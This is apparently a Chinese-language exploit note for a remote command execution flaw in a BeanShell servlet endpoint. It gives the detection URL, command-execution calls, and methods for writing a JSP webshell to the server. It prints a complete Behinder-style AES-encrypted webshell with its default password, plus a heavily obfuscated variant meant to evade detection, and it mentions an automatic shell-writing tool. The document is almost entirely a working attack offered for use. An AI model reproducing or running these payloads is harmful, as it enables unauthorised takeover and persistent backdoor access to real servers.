## 0x00 漏洞检测

URL+/servlet/~ic/bsh.servlet.BshServlet

## 0x01 漏洞利用

  exec("cmd /c whoami.exe")
  exec("/bin/sh whoami")

## 0x02 写webshell

   通常Windows系统将webshell <>变成^<和^>然后进行写入，例如某蝎的
   ```
   ^<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%^>^<%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%^>^<%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%^> > D:\1.jsp
   ```
但是bsh的webshell需要进行转义，但是当我们引用双引号引用内容时不需要进行转义，结果会导致shell被引号引起无法解析。所以在网上看到了一个实用的小tips
  ```
exec(cmd /c echo \">shell<\") >shell.jsp;
shell.jsp的内容为：">shell<"
其中\"表示""
```
 ```
exec("cmd /c echo \"><%@page import=\"sun.misc.*,javax.crypto.Cipher,javax.crypto.spec.SecretKeySpec,java.util.Random\" %><%! class govPkEEwdoozySiL3E extends \u0043l\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072 {govPkEEwdoozySiL3E(\u0043l\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072 govXua) {super(govXua);}public Class gov4k6(byte[] govR5DPQ) {return super.d\uuuuuuuuu0065fineClass/*govpmXukgv*/(govR5DPQ,0,govR5DPQ.length);}}%><%out.println(\"Random Garbage Data:\");Random govjE4OZjT6dsj = new Random();int govexbQJjny = govjE4OZjT6dsj.nextInt(1234);int govVoMJHvNbM = govjE4OZjT6dsj.nextInt(5678);int govXM8ClK = govjE4OZjT6dsj.nextInt(1357);int govAVeIPtBmc = govjE4OZjT6dsj.nextInt(2468);out.println(govexbQJjny+\",\"+govVoMJHvNbM+\",\"+govXM8ClK+\",\"+govAVeIPtBmc);String[] govGPaXMZ9RC = new String[]{\"A\", \"P\", \"B\", \"O\", \"C\", \"S\", \"D\", \"T\"};String govdSxidE = govGPaXMZ9RC[1] + govGPaXMZ9RC[3] + govGPaXMZ9RC[5] + govGPaXMZ9RC[7];if (request.getMethod().equals(govdSxidE)) {String govQgB4OeRejyK5U = new String(new B\u0041\u0053\u0045\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065\u0072()/*govJ5l9v6AbXE8a6*/./*gov7*/decodeBuffer/*govmIp7*/(\"MTZhY2FjYzA1YWFmYWY2Nw==\"));session.setAttribute(\"u\", govQgB4OeRejyK5U);Cipher govGk91RlL = Cipher.getInstance(\"AES\");govGk91RlL.init(((govexbQJjny * govVoMJHvNbM + govXM8ClK - govAVeIPtBmc) * 0) + 3 - 1, new SecretKeySpec(govQgB4OeRejyK5U.getBytes(), \"AES\"));new govPkEEwdoozySiL3E(this.\u0067\u0065t\u0043\u006c\u0061\u0073\u0073().\u0067\u0065t\u0043\u006c\u0061\u0073\u0073Loader()).gov4k6(govGk91RlL.doFinal(new sun.misc./*govVz*/B\u0041\u0053\u0045\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065\u0072()./*govlnLTHdcPcAM*/decodeBuffer(request.getReader().readLine()))).newInstance()/*govzTPOMyCVHRP*/.equals(pageContext);}%><\" > webapps/nc_web/123.jsp");
 ```
## 0x04 附件上传了自动写shell工具
